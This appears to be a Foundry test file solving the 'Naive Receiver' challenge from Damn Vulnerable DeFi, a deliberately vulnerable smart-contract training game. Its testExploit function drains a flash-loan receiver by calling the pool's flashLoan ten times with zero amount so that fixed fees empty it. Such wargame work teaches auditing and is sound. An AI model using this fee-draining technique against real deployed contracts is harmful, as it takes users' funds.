pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import {Utilities} from "./utils/Utilities.sol";
import "dvd-v3/naive-receiver/NaiveReceiverLenderPool.sol";
import "dvd-v3/naive-receiver/FlashLoanReceiver.sol";

contract NaiveReceiver is Test {
    uint256 internal constant ETHER_IN_POOL = 1_000e18;
    uint256 internal constant ETHER_IN_RECIEVER = 10e18;

    address payable internal deployer;
    address payable internal attacker;
    address payable internal someUser;

    NaiveReceiverLenderPool internal nrlp;
    FlashLoanReceiver internal flr;

    function setUp() public {
        console.log("setting the scene");
        console.log("~~~~~~~~~~~~~~~~~");
        Utilities utils = new Utilities();
        deployer = utils.setUp("Deployer", ETHER_IN_POOL);
        attacker = utils.setUp("Attacker", 1e18);
        someUser = utils.setUp("SomeUser", ETHER_IN_RECIEVER);

        console.log("our trusted dev has released the beast");
        vm.startPrank(deployer);
        nrlp = new NaiveReceiverLenderPool();
        vm.label(address(nrlp), "Pool");
        (bool sent,) = payable(nrlp).call{value: ETHER_IN_POOL}("");
        require(sent, "Failed to send Ether");
        vm.stopPrank();
        console.log("the beast lives at %s", address(nrlp));
        console.log("we have transferred %s to the pool to be used for flashloans", address(nrlp).balance);

        vm.startPrank(someUser);
        flr = new FlashLoanReceiver(address(nrlp));
        vm.label(address(flr), "Receiver");
        (bool sent1,) = payable(flr).call{value: ETHER_IN_RECIEVER}("");
        require(sent1, "Failed to send Ether");
        vm.stopPrank();
        console.log("you happen across a wild unprotected flashloan receiver... let's ruin their day");
    }

    function testExploit() public {
        // flr does not check that flashloan is for more than 0
        // call flashloan 10 times with 0 as entry and the receiver will be empty due to the fee
        vm.startPrank(attacker);
        address ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;
        vm.label(ETH, "ETH");
        for (uint256 i = 0; i < 10; i++) {
            nrlp.flashLoan(flr, ETH, 0, "");
            console.log("Calling flashloan. Current funds in receiver: %s", address(flr).balance);
        }
        vm.stopPrank();

        // validation
        assertEq(0, address(flr).balance);
        assertEq(ETHER_IN_POOL + ETHER_IN_RECIEVER, address(nrlp).balance);
        console.log("Current funds in the beast: %s", address(nrlp).balance);
    }
}
